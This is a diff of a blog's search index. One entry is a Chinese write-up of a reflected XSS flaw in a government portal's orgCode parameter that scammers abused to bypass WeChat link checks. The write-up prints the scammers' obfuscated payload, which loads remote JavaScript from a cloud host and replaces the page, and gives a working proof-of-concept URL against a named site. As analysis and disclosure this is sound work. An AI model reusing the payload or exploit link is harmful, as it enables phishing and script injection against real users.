@@ -22,7 +22,7 @@
   <entry>
     <title>Back2</title>
     <url>/2019/01/04/life/Back2/</url>
-    <content><![CDATA[<p>… 估计是 Coding.net 和 腾讯还没合并好，各种 bug，SSH-key 推的服务器 <code><a href="mailto:&#x67;&#105;&#x74;&#64;&#x67;&#105;&#116;&#46;&#x63;&#x6f;&#x64;&#105;&#110;&#x67;&#x2e;&#x6e;&#x65;&#116;">&#x67;&#105;&#x74;&#64;&#x67;&#105;&#116;&#46;&#x63;&#x6f;&#x64;&#105;&#110;&#x67;&#x2e;&#x6e;&#x65;&#116;</a></code> <code><a href="mailto:&#x67;&#105;&#x74;&#64;&#x67;&#105;&#x74;&#x2e;&#x64;&#101;&#x76;&#x2e;&#x74;&#101;&#x6e;&#x63;&#101;&#110;&#x74;&#46;&#99;&#111;&#109;">&#x67;&#105;&#x74;&#64;&#x67;&#105;&#x74;&#x2e;&#x64;&#101;&#x76;&#x2e;&#x74;&#101;&#x6e;&#x63;&#101;&#110;&#x74;&#46;&#99;&#111;&#109;</a></code> 傻傻分不清楚，搞了一下午。主要是腾讯的文档里面全是 Coding.net，这就很蛋疼了。而且说迁移到腾讯可以无限空间，可是我发布 Pages 服务一直 404，反反复复搞了好久，最后发现还是和 Coding.net 一样，超过 100M 不可用。。。 最重要的是相关文档迁移到腾讯以后容量这部分说明已经删掉了。蛋碎……</p>
+    <content><![CDATA[<p>… 估计是 Coding.net 和 腾讯还没合并好，各种 bug，SSH-key 推的服务器 <code><a href="mailto:&#103;&#x69;&#116;&#x40;&#103;&#105;&#116;&#x2e;&#x63;&#111;&#x64;&#x69;&#x6e;&#103;&#x2e;&#110;&#101;&#116;">&#103;&#x69;&#116;&#x40;&#103;&#105;&#116;&#x2e;&#x63;&#111;&#x64;&#x69;&#x6e;&#103;&#x2e;&#110;&#101;&#116;</a></code> <code><a href="mailto:&#x67;&#x69;&#116;&#64;&#103;&#105;&#116;&#x2e;&#100;&#101;&#118;&#46;&#116;&#101;&#x6e;&#99;&#101;&#110;&#116;&#46;&#99;&#111;&#109;">&#x67;&#x69;&#116;&#64;&#103;&#105;&#116;&#x2e;&#100;&#101;&#118;&#46;&#116;&#101;&#x6e;&#99;&#101;&#110;&#116;&#46;&#99;&#111;&#109;</a></code> 傻傻分不清楚，搞了一下午。主要是腾讯的文档里面全是 Coding.net，这就很蛋疼了。而且说迁移到腾讯可以无限空间，可是我发布 Pages 服务一直 404，反反复复搞了好久，最后发现还是和 Coding.net 一样，超过 100M 不可用。。。 最重要的是相关文档迁移到腾讯以后容量这部分说明已经删掉了。蛋碎……</p>
 <p>还是回到 Github 算了，虽然不FQ速度真是慢~ 然后把 Github 的 Commit 恢复到第一版了，因为这几年的 Commit 里面有不少隐私信息，几百条 Commit 又不好找。干脆一了百了~ 有一次直接有人打电话给我说外包的事情真是吓到我了，我都忘了什么时候把自己电话 Push 上去了。。。 Coding 可以免费隐私项目，也是迁移的主要原因吧。 Github 上就一些个人项目 也没必要为了博客付费了（付费我还不如直接搭在 Vps 上……）。</p>
 <p>Coding.net 还是等等看吧~</p>
 ]]></content>
@@ -761,9 +761,9 @@ $("h2").addClass("blockquote-center");
   </entry>
   <entry>
     <title>政务网漏洞</title>
-    <url>/2023/05/29/study/web/%E6%94%BF%E5%8A%A1%E7%BD%91%E6%BC%8F%E6%B4%9E/</url>
+    <url>/2023/09/14/study/web/%E6%94%BF%E5%8A%A1%E7%BD%91%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<h3 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h3><p>朋友圈看到有骗人分享，链接是 <code>gov.cn</code>，通过政务网做跳板，绕过微信备案风控。</p>
-<p><img src="/2023/05/29/study/web/%E6%94%BF%E5%8A%A1%E7%BD%91%E6%BC%8F%E6%B4%9E/1.jpg" alt="朋友圈"></p>
+<p><img src="/2023/09/14/study/web/%E6%94%BF%E5%8A%A1%E7%BD%91%E6%BC%8F%E6%B4%9E/1.jpg" alt="朋友圈"></p>
 <h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>抓包溯源链接为</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://xxxxxxxxx.gov.cn/jxzw/ncBmCity/getNcBmIndex.do?orgCode=%22%3B%7D%29%25%318%3Bi2%3D%27bjk%27%3Ba%3D%7B%27l%27%3Athis%2C%27k%27%3A%27%5C163etTimeout%27%2C%27r%27%3A%27a%27%2C%27t%27%3A%27%5C164o%5C142%27%7D%3Ba.l%5Ba.k%5D%28a.l%5Ba.r%2Ba.t%5D%28i2%2B%279ZG9jdW1lbnQNCm45LmRvY3VtZW50RWxlbWVudC5oaWRkZW49JzEnDQpuOS50aXRsZT0nTG9hZGluZy4uLicNCmltcG9ydCgnLy92MmxvYWQub3NzLWNuLXNoYW5naGFpLmFsaXl1bmNzLmNvbS9oejE1LmpzPz8%2Fd3g9Jyk%3D%27%2C1%29%29%25%318%3B%24%28function%28%29%20%7Bvar%20orgCode%20%3D%20%22&amp;gdohll=cd1c3558c715249c11286cba506430c183efe2fcabf30dddaeff81be20aa1713abf60d#1680926768635</span><br></pre></td></tr></table></figure>
 
@@ -771,17 +771,17 @@ $("h2").addClass("blockquote-center");
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`https://xxxxxxxxx.gov.cn/jxzw/ncBmCity/getNcBmIndex.do?orgCode=&quot;;&#125;)%18;i2=&#x27;bjk&#x27;;a=&#123;&#x27;l&#x27;:this,&#x27;k&#x27;:&#x27;\\163etTimeout&#x27;,&#x27;r&#x27;:&#x27;a&#x27;,&#x27;t&#x27;:&#x27;\\164o\\142&#x27;&#125;;a.l[a.k](a.l[a.r+a.t](i2+&#x27;9ZG9jdW1lbnQNCm45LmRvY3VtZW50RWxlbWVudC5oaWRkZW49JzEnDQpuOS50aXRsZT0nTG9hZGluZy4uLicNCmltcG9ydCgnLy92MmxvYWQub3NzLWNuLXNoYW5naGFpLmFsaXl1bmNzLmNvbS9oejE1LmpzPz8/d3g9Jyk=&#x27;,1))%18;$(function() &#123;var orgCode = &quot;&amp;gdohll=cd1c3558c715249c11286cba506430c183efe2fcabf30dddaeff81be20aa1713abf60d#1680926768635`</span><br></pre></td></tr></table></figure>
 
 <p>一眼 <code>orgCode</code> 接口未限制，可以任意执行 js。</p>
-<p><img src="/2023/05/29/study/web/%E6%94%BF%E5%8A%A1%E7%BD%91%E6%BC%8F%E6%B4%9E/2.jpg" alt="漏洞发现"></p>
+<p><img src="/2023/09/14/study/web/%E6%94%BF%E5%8A%A1%E7%BD%91%E6%BC%8F%E6%B4%9E/2.jpg" alt="漏洞发现"></p>
 <h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>拆解分析后得知，</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;n9=document\r\nn9.documentElement.hidden=&#x27;1&#x27;\r\nn9.title=&#x27;Loading...&#x27;\r\nimport(&#x27;//v2load.oss-cn-shanghai.aliyuncs.com/hz15.js???wx=&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2023/05/29/study/web/%E6%94%BF%E5%8A%A1%E7%BD%91%E6%BC%8F%E6%B4%9E/3.jpg" alt="漏洞分析"></p>
+<p><img src="/2023/09/14/study/web/%E6%94%BF%E5%8A%A1%E7%BD%91%E6%BC%8F%E6%B4%9E/3.jpg" alt="漏洞分析"></p>
 <p>注入后通过 <code>http://v2load.oss-cn-shanghai.aliyuncs.com/hz15.js???wx=</code> 载入远程代码</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">document.title=&quot;Loading...&quot;;document.documentElement.hidden=1;</span><br><span class="line">(function()&#123;</span><br><span class="line">    var rmd = Math.random().toString(36).substr(2,7);</span><br><span class="line">    var geUrl=&#x27;//47__100__4__56/&#x27;+rmd+&#x27;?ref=&#x27;+encodeURIComponent(location.href.split(&#x27;#&#x27;)[0]);</span><br><span class="line">    var xhr=new XMLHttpRequest;xhr.onload=function()&#123;var onhash=window.onhashchange;var h=xhr.responseText;var a=document.open(&quot;text/html&quot;,&quot;replace&quot;);a.write(h);a.close();window.onhashchange=onhash&#125;;</span><br><span class="line">    xhr.open(&quot;GET&quot;,geUrl,!0);xhr.send();</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
 
 <p>最终载入 <code>47__100__4__56</code> (阿里云上海) 服务器上的页面</p>
 <p>尝试在 <code>orgCode</code> 带入不同入参后确认后端无任何过滤，直接返回前端输入导致漏洞</p>
-<p><img src="/2023/05/29/study/web/%E6%94%BF%E5%8A%A1%E7%BD%91%E6%BC%8F%E6%B4%9E/4.jpg" alt="漏洞尝试"></p>
+<p><img src="/2023/09/14/study/web/%E6%94%BF%E5%8A%A1%E7%BD%91%E6%BC%8F%E6%B4%9E/4.jpg" alt="漏洞尝试"></p>
 <h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>所以可以通过构造字符串执行任意代码。<br>例如以下链接，弹出 <code>1</code>，并跳转 <code>baidu.com</code></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://gzkfq.jxzwfww.gov.cn/jxzw/ncBmCity/getNcBmIndex.do?orgCode=%22;alert(1)%3Bwindow.location.href%3D%22http%3A%2F%2Fwww.baidu.com</span><br></pre></td></tr></table></figure>
 ]]></content>
